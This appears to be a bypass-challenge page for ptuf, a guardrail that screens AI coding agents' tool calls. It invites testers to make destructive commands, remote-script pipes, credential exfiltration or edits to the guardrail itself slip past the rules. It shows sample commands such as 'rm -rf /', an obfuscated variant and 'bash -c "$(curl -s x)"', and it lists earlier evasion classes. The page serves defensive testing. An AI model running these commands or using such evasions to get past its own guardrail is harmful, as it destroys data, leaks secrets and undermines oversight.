# Bypass challenge

ptuf claims that its built-in rules understand shell syntax well enough
that rewriting a dangerous command does not get it past the guardrail.
We would rather have that claim tested by you than by an agent in the
wild. If you can get one of the calls below allowed, we want to hear
about it.

## The targets

Try to make ptuf return `Decision: allow` for a call that still does one
of these things when the agent runs it:

| Goal | Rule that should stop it |
| --- | --- |
| Recursively delete `/`, a system root, a mount root, or a home directory | `core.filesystem.destructive-rm` |
| Pipe a remote script into an interpreter | `core.network.remote-script-pipe` |
| Send credentials (`~/.ssh`, `~/.aws/credentials`, `.env`, …) over the network | `core.secrets.sensitive-path-to-network` |
| Read a credential file through `Read` / `Edit` / `Grep` / MCP | `core.secrets.sensitive-read` |
| Edit ptuf's own config, binary, or hook registration | `core.self_protection.*` |

The full rule catalogue is in
[`docs/design/policy-packs.md`](design/policy-packs.md).

## How to try

No agent is needed. Install ptuf and feed candidate calls to the manual
evaluator:

```bash
ptuf check --tool Bash 'rm -rf /'                 # Decision: deny
ptuf check --tool Bash 'r""m -rf "/"'             # still deny
ptuf check --tool Bash 'bash -c "$(curl -s x)"'   # still deny
```

`ptuf check` runs the same engine as the hook. A call counts as a bypass
when `ptuf check` (or the hook for your agent) allows it with the default
configuration *and* the shell would really perform the dangerous action.

Before you start, skim what is already covered or acknowledged:

- [`tests/bypass/corpus.jsonl`](../tests/bypass/corpus.jsonl) — 200+
  evasion attempts that are regression-tested on every PR. Lines marked
  `known_gap` are documented limitations, not new findings.
- [`docs/adr/`](adr/) — write-ups of earlier bypass classes (absolute-path
  heads, first-segment globs, Unicode homoglyphs, command-substitution
  re-entry, …) and how they were closed.

## Out of scope

- Commands a user runs themselves, outside an agent hook.
- Configurations that explicitly allow the call (`overrides.allow`, a
  disabled rule, a user plugin).
- Opaque interpreter calls such as `python -c '…'` or `eval`: ptuf cannot
  see what runs inside them, so it asks (`core.engine.dynamic-eval`)
  instead of claiming to understand them. An `ask` there is expected.

## Found one?

Report it privately through
[GitHub private vulnerability reporting](https://github.com/watany-dev/ptuf/security/advisories/new),
as described in [`SECURITY.md`](../SECURITY.md). Please do not post a
working bypass in a public issue or PR. Include the exact `tool_name`
and `tool_input`, the ptuf version (`ptuf --version`), and the decision
you got.

Confirmed bypasses are fixed, added to the corpus as `must_catch` cases
so they can never silently come back, and credited in the release notes
unless you prefer to stay anonymous.
